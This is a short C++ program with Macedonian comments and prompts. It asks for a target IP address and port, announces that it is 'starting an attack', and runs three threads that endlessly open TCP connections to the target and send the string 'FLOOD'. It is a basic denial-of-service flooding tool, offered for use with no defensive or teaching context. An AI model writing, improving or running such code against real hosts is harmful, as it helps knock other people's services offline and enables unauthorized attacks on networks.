#include <iostream>
#include <thread>
#include <chrono>
#include <cstring>

#ifdef _WIN32
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#endif

using namespace std;

void flood(string ip, int port) {
#ifdef _WIN32
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
#endif

    while (true) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(port);
        target.sin_addr.s_addr = inet_addr(ip.c_str());

        connect(sock, (sockaddr*)&target, sizeof(target));
        send(sock, "FLOOD", 5, 0);  // Испраќа мал стринг

#ifdef _WIN32
        closesocket(sock);
#else
        close(sock);
#endif

        this_thread::sleep_for(chrono::milliseconds(10)); // не го прегреј системот
    }
}

int main() {
    string ip;
    int port;

    cout << "Внеси IP адреса: ";
    cin >> ip;
    cout << "Внеси порт (пример 80): ";
    cin >> port;

    cout << "Почнувам напад на " << ip << ":" << port << endl;

    thread t1(flood, ip, port);
    thread t2(flood, ip, port);
    thread t3(flood, ip, port);

    t1.join();
    t2.join();
    t3.join();

    return 0;
}
